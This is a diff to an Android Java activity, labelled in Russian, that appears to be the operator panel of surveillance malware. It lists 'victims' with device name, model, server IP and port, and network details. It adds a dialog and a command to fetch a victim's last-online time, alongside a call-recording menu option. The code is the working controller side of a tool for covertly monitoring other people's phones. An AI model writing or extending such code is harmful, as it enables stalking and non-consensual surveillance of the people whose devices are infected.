@@ -105,7 +105,9 @@ public class VictimsActivity extends AppCompatActivity {
         String model = (String) info.get("model");
         String ip = (String) info.get("ip");
         int serverPort = ((Long) info.get("serverPort")).intValue();
-        long lastOnline = (long) info.get("lastOnline");
+        String netType = (String) info.get("netType");
+        String netName = (String) info.get("netName");
+        String netSubtype = (String) info.get("netSubtype");
 
         LayoutInflater layoutInflater = LayoutInflater.from(this);
         final View infoView = layoutInflater.inflate(R.layout.view_victiminfo, null);
@@ -118,19 +120,52 @@ public class VictimsActivity extends AppCompatActivity {
         TextView modelTextView = (TextView) infoView.findViewById(R.id.modelTextView);
         TextView ipTextView = (TextView) infoView.findViewById(R.id.ipTextView);
         TextView serverPortTextView = (TextView) infoView.findViewById(R.id.serverPortTextView);
-        TextView lastOnlineTextView = (TextView) infoView.findViewById(R.id.lastOnlineTextView);
+        TextView netTypeTextView = (TextView) infoView.findViewById(R.id.netTypeTextView);
+        TextView netNameTextView = (TextView) infoView.findViewById(R.id.netNameTextView);
+        TextView netSubtypeTextView = (TextView) infoView.findViewById(R.id.netSubtypeTextView);
 
-        String lastOnlineText = new Date(lastOnline).toString();
-        int diff = (int) ((System.currentTimeMillis() - lastOnline) / 1000);
-        if (diff < 60*60)
-            lastOnlineText = diff + " сек. назад";
 
         victimTextView.setText("Жертва: " + victim);
         phoneNameTextView.setText("Телефон: " + phoneName);
         modelTextView.setText("Модель: " + model);
         ipTextView.setText("SERVER_IP: " + ip);
         serverPortTextView.setText("SERVER_PORT: " + serverPort);
-        lastOnlineTextView.setText("Online: " + lastOnlineText);
+        netTypeTextView.setText("Тип инета: " + netType);
+        netNameTextView.setText("Имя инета: " + netName);
+        netSubtypeTextView.setText("Тип сети: " + netSubtype);
+
+        alertDialogBuilder.setCancelable(false);
+        alertDialogBuilder.setPositiveButton("ОК", new DialogInterface.OnClickListener() {
+            @Override
+            public void onClick(DialogInterface dialog, int which) {
+                dialog.cancel();
+            }
+        });
+
+        alertDialogBuilder.setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
+            @Override
+            public void onClick(DialogInterface dialog, int which) {
+                dialog.cancel();
+            }
+        });
+
+        alertDialogBuilder.create();
+        alertDialogBuilder.show();
+    }
+
+    public void initVictimLastOnline(String victim, String lastOnline) {
+        LayoutInflater layoutInflater = LayoutInflater.from(this);
+        final View infoView = layoutInflater.inflate(R.layout.view_victimlastonline, null);
+
+        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
+        alertDialogBuilder.setView(infoView);
+
+        TextView victimTextView = (TextView) infoView.findViewById(R.id.victimTextView);
+        TextView lastOnlineTextView = (TextView) infoView.findViewById(R.id.lastOnlineTextView);
+
+
+        victimTextView.setText("Жертва: " + victim);
+        lastOnlineTextView.setText("Онлайн: " + lastOnline);
 
         alertDialogBuilder.setCancelable(false);
         alertDialogBuilder.setPositiveButton("ОК", new DialogInterface.OnClickListener() {
@@ -172,11 +207,7 @@ public class VictimsActivity extends AppCompatActivity {
                 NettyClient.getInstance().sendGetVictimInfo(victim);
                 break;
             case "Последний онлайн":
-                /*outputJSONObject = new JSONObject();
-                    outputJSONObject.put("action", "getLastOnline");
-                    outputJSONObject.put("victim", victim);
-                    outputJSONObject.put("token", Config.token);*/
-                //MainActivity.getInstance().sendMessage(outputJSONObject);
+                NettyClient.getInstance().sendGetLastOnline(victim);
                 break;
             case "Запись разговора":
                 LayoutInflater layoutInflater = LayoutInflater.from(this);
